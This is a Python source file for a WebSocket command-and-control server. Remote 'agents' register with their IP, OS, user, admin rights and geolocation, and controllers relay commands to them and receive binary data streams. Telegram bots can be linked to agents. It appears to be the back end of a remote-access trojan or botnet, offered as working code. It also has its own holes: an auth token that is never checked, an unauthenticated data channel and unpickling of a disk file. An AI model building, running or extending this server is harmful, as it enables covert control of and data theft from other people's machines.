import asyncio
import json
import websockets
import sys
import io
import logging
import os
import secrets
import argparse
import pickle
from encryption import AESCrypto, server_crypto
from datetime import datetime


logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("server.log", encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)

CONFIG_FILE = "server_config.json"

def load_or_generate_token():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                config = json.load(f)
                token = config.get("auth_token")
                if token:
                    logging.info(f"[+] Token loaded from {CONFIG_FILE}")
                    return token
        except Exception as e:
            logging.warning(f"Could not read config: {e}")
    
    new_token = secrets.token_hex(16)
    config = {
        "auth_token": new_token,
        "created_at": datetime.now().isoformat(),
        "note": "Keep this token! Use it in controller."
    }
    
    try:
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2, ensure_ascii=False)
        logging.info(f"[+] New token generated and saved to {CONFIG_FILE}")
        logging.info(f"[+] TOKEN: {new_token}")
        print("\n" + "="*60)
        print(f"[+] YOUR AUTHENTICATION TOKEN:")
        print(f"   {new_token}")
        print("="*60 + "\n")
        print("[+] Save this token! You'll need it for controller.")
    except Exception as e:
        logging.error(f"Could not save token: {e}")
        new_token = "default_insecure_token_change_me"
    
    return new_token

parser = argparse.ArgumentParser(description="WebSocket Server with AES encryption")
parser.add_argument("--aes-key", type=str, help="AES encryption key (optional, enables encryption)")
args = parser.parse_args()

AES_KEY = args.aes_key
if AES_KEY:
    server_crypto.set_key(AES_KEY)
    logging.info(f"[+] AES encryption ENABLED with provided key")
else:
    logging.info("[-] AES encryption DISABLED (plain text mode)")

AUTH_TOKEN = load_or_generate_token()

if sys.platform == 'win32':
    if hasattr(sys.stdout, "buffer"):
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    if hasattr(sys.stderr, "buffer"):
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

connected_agents = {}
connected_controllers = set()
connected_bots = {}


BOTS_FILE = "telegram_bots.dat"
if os.path.exists(BOTS_FILE):
    try:
        with open(BOTS_FILE, "rb") as f:
            saved_bots = pickle.load(f)
            if isinstance(saved_bots, dict):
                connected_bots = saved_bots
                logging.info(f"[+] Loaded {len(connected_bots)} bots from {BOTS_FILE}")
    except Exception as e:
        logging.warning(f"Could not load bots from {BOTS_FILE}: {e}")

async def decrypt_message(encrypted_msg: str):
    if server_crypto.key:
        try:
            decrypted = server_crypto.decrypt(encrypted_msg)
            return json.loads(decrypted)
        except Exception as e:
            try:
                return json.loads(encrypted_msg)
            except:
                logging.debug(f"Decryption failed: {e}")
                return None
    return json.loads(encrypted_msg)

async def encrypt_message(data: dict):
    msg_str = json.dumps(data)
    if server_crypto.key:
        return server_crypto.encrypt(msg_str)
    return msg_str

async def broadcast_agents():
    if not connected_controllers:
        return

    agents_list_for_json = {
        aid: {k: v for k, v in info.items() if k != 'ws'}
        for aid, info in connected_agents.items()
    }
    
    message = await encrypt_message({
        "type": "agents_list",
        "agents": agents_list_for_json
    })

    disconnected_ctrls = set()
    tasks = [ws.send(message) for ws in connected_controllers]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    for i, res in enumerate(results):
        if isinstance(res, Exception):
            ws = list(connected_controllers)[i]
            disconnected_ctrls.add(ws)

    for ws in disconnected_ctrls:
        connected_controllers.remove(ws)
        logging.info("[-] Controller removed after connection loss during broadcast.")

async def relay_to_controllers(message_str, agent_id):
    if not connected_controllers:
        return

    try:
        data = json.loads(message_str)
        data['agent_id'] = agent_id
        message_to_send = await encrypt_message(data)
    except json.JSONDecodeError:
        logging.warning(f"Could not parse JSON from agent {agent_id}")
        return

    tasks = [ws.send(message_to_send) for ws in connected_controllers]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    disconnected_ctrls = set()
    for i, result in enumerate(results):
        if isinstance(result, Exception):
            ws = list(connected_controllers)[i]
            disconnected_ctrls.add(ws)
    
    for ws in disconnected_ctrls:
        connected_controllers.remove(ws)
        logging.info("[-] Controller removed after connection loss.")

async def broadcast_bots_list():

    if not connected_controllers:
        return
    
    bots_list = []
    for token, bot_info in connected_bots.items():
        bots_list.append({
            'token': token,
            'name': bot_info.get('name'),
            'users': bot_info.get('users', []),
            'proxy': bot_info.get('proxy'),
            'agents': bot_info.get('agents', {})
        })
    
    message = await encrypt_message({
        "type": "bots_list",
        "bots": bots_list
    })
    
    tasks = [ws.send(message) for ws in connected_controllers]
    await asyncio.gather(*tasks, return_exceptions=True)
    

    try:
        with open(BOTS_FILE, "wb") as f:
            pickle.dump(connected_bots, f)
    except Exception as e:
        logging.error(f"Failed to save bots to disk: {e}")

async def send_agent_notification(agent_info):
    if not connected_controllers:
        logging.info("[!] No controllers connected, skipping notification")
        return
    logging.info(f"[*] Sending notification about new agent: {agent_info.get('name')} to {len(connected_controllers)} controller(s)")
    notification = await encrypt_message({
        "type": "agent_connected_notification",
        "agent_id": agent_info.get("id"),
        "agent_name": agent_info.get("name"),
        "agent_ip": agent_info.get("ip"),
        "agent_os": agent_info.get("os"),
        "agent_user": agent_info.get("user"),
        "is_admin": agent_info.get("is_admin", False),
        "geo": agent_info.get("geo", {}),
        "timestamp": datetime.now().isoformat()
    })
    
    disconnected_ctrls = set()
    for ctrl_ws in connected_controllers:
        try:
            await ctrl_ws.send(notification)
        except:
            disconnected_ctrls.add(ctrl_ws)
    
    for ctrl_ws in disconnected_ctrls:
        connected_controllers.discard(ctrl_ws)

async def handle_connection(websocket):
    client_type = None
    agent_id = None
    
    try:
        first_msg_str = await asyncio.wait_for(websocket.recv(), timeout=15)
        data = await decrypt_message(first_msg_str)
        
        if not data: return
        
        if data.get("type") == "data_channel":
            target_agent_id = data.get("id")
            logging.info(f"[→] Data Channel opened for agent: {target_agent_id}")
            async for bin_msg in websocket:
                for ctrl_ws in connected_controllers:
                    await ctrl_ws.send(bin_msg)
            return

        if server_crypto.key and data.get("aes_key") != AES_KEY:
            await websocket.close(1008, "AES Key mismatch")
            logging.warning(f"AES mismatch from {websocket.remote_address}")
            return

        if data.get("type") == "controller":
            client_type = "controller"
            connected_controllers.add(websocket)
            logging.info(f"[+] Controller connected: {websocket.remote_address}")
            await broadcast_agents()
            await broadcast_bots_list()
            
            async for msg_str in websocket:
                try:
                    cmd_data = await decrypt_message(msg_str)
                    if not cmd_data: continue
                    

                    if cmd_data.get("type") == "bots_list_sync":
                        bots_data = cmd_data.get("bots", [])
                        for bot_data in bots_data:
                            token = bot_data.get('token')
                            if token not in connected_bots:

                                connected_bots[token] = {
                                    'name': bot_data.get('name'),
                                    'users': bot_data.get('users', []),
                                    'proxy': bot_data.get('proxy'),
                                    'agents': bot_data.get('agents', {})
                                }
                                logging.info(f"[+] New bot from sync: {bot_data.get('name')}")
                            else:

                                existing_agents = connected_bots[token]['agents']
                                new_agents = bot_data.get('agents', {})
                                for agent_id_sync, agent_info in new_agents.items():
                                    if agent_id_sync not in existing_agents:
                                        existing_agents[agent_id_sync] = agent_info
                                        logging.info(f"[+] Agent {agent_id_sync} linked to bot {token}")

                                connected_bots[token]['name'] = bot_data.get('name')
                                connected_bots[token]['users'] = bot_data.get('users', [])
                        await broadcast_bots_list()
                        continue
                    

                    bot_command = cmd_data.get("bot_command")
                    
                    if bot_command == "add_bot":
                        token = cmd_data.get("token")
                        bot_name = cmd_data.get("bot_name")
                        allowed_users = cmd_data.get("allowed_users", [])
                        proxy_url = cmd_data.get("proxy_url")
                        
                        connected_bots[token] = {
                            'name': bot_name,
                            'users': allowed_users,
                            'proxy': proxy_url,
                            'agents': {}
                        }
                        
                        logging.info(f"[+] Bot {bot_name} added")
                        await broadcast_bots_list()
                        await websocket.send(await encrypt_message({
                            "type": "bot_operation_result",
                            "success": True,
                            "msg": f"Bot {bot_name} added",
                            "operation": "add_bot",
                            "token": token
                        }))
                        
                    elif bot_command == "remove_bot":
                        token = cmd_data.get("token")
                        
                        if token in connected_bots:
                            bot_name = connected_bots[token].get('name', 'Unknown')
                            del connected_bots[token]
                            logging.info(f"[+] Bot {bot_name} removed")
                            await broadcast_bots_list()
                            await websocket.send(await encrypt_message({
                                "type": "bot_operation_result",
                                "success": True,
                                "msg": f"Bot deleted successfully",
                                "operation": "delete_bot",
                                "token": token
                            }))
                    
                    elif bot_command == "link_agent":
                        token = cmd_data.get("token")
                        agent_id_link = cmd_data.get("agent_id")
                        agent_info = cmd_data.get("agent_info", {})
                        
                        if token in connected_bots:
                            connected_bots[token]['agents'][agent_id_link] = agent_info
                            logging.info(f"[+] Agent {agent_id_link} linked to bot {token}")
                            await broadcast_bots_list()
                            await websocket.send(await encrypt_message({
                                "type": "bot_operation_result",
                                "success": True,
                                "msg": f"Agent linked to bot",
                                "operation": "link_agent",
                                "token": token,
                                "agent_id": agent_id_link
                            }))
                    
                    elif bot_command == "unlink_agent":
                        token = cmd_data.get("token")
                        agent_id_unlink = cmd_data.get("agent_id")
                        
                        if token in connected_bots and agent_id_unlink in connected_bots[token]['agents']:
                            del connected_bots[token]['agents'][agent_id_unlink]
                            logging.info(f"[+] Agent {agent_id_unlink} unlinked from bot {token}")
                            await broadcast_bots_list()
                            await websocket.send(await encrypt_message({
                                "type": "bot_operation_result",
                                "success": True,
                                "msg": f"Agent unlinked from bot",
                                "operation": "unlink_agent",
                                "token": token,
                                "agent_id": agent_id_unlink
                            }))

                    else:
                        target_id = cmd_data.get("target")
                        if target_id and target_id in connected_agents:
                            target_ws = connected_agents[target_id].get("ws")
                            if target_ws:
                                await target_ws.send(msg_str)
                                logging.debug(f"Command relayed to {target_id}")
                                
                except Exception as e:
                    logging.warning(f"Error processing controller command: {e}")

        else:
            client_type = "agent"
            agent_id = data.get("id")
            if not agent_id: raise ValueError("No Agent ID")
            
            agent_info = {
                "ws": websocket,
                "name": data.get("name"), 
                "ip": data.get("ip"), 
                "os": data.get("os"),
                "user": data.get("user"), 
                "is_admin": data.get("is_admin"),
                "status": "online", 
                "geo": data.get("geo", {}),
                "disabled_modules": data.get("disabled_modules", [])
            }
            
            is_new_agent = agent_id not in connected_agents
            
            connected_agents[agent_id] = agent_info
            logging.info(f"[+] Agent connected: {data.get('name')} | AES: {bool(server_crypto.key)}")
            

            if is_new_agent:

                await send_agent_notification({
                    "id": agent_id,
                    "name": data.get("name"),
                    "ip": data.get("ip"),
                    "os": data.get("os"),
                    "user": data.get("user"),
                    "is_admin": data.get("is_admin", False),
                    "geo": data.get("geo", {})
                })

            
            await broadcast_agents()

            async for msg_str in websocket:
                await relay_to_controllers(msg_str, agent_id)
                
    except Exception as e:
        logging.error(f"Error in handle_connection: {e}")
    finally:
        if client_type == "controller":
            connected_controllers.discard(websocket)
            logging.info(f"[-] Controller disconnected: {websocket.remote_address}")
        elif client_type == "agent" and agent_id in connected_agents:

            for token, bot_info in connected_bots.items():
                if agent_id in bot_info.get('agents', {}):
                    del bot_info['agents'][agent_id]
                    logging.info(f"[*] Agent {agent_id} auto-unlinked from bot {bot_info.get('name')}")
            
            del connected_agents[agent_id]
            logging.info(f"[-] Agent disconnected: {agent_id}")

            message = await encrypt_message({
                "type": "agent_disconnected",
                "agent_id": agent_id
            })
            tasks = [ws.send(message) for ws in connected_controllers]
            await asyncio.gather(*tasks, return_exceptions=True)
            await broadcast_agents()
            await broadcast_bots_list()

async def main():
    PORT = 8081
    logging.info(f"WebSocket server starting on port {PORT}...")
    logging.info(f"[+] Authentication token: {AUTH_TOKEN}")
    if AES_KEY:
        logging.info(f"[+] AES encryption ENABLED")
    else:
        logging.info("[-] AES encryption DISABLED (plain text mode)")
    logging.info("Press Ctrl+C to stop")
    
    async with websockets.serve(handle_connection, "0.0.0.0", PORT, max_size=524288000, ping_interval=20, ping_timeout=15):
        await asyncio.Future()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("\nServer stopped")
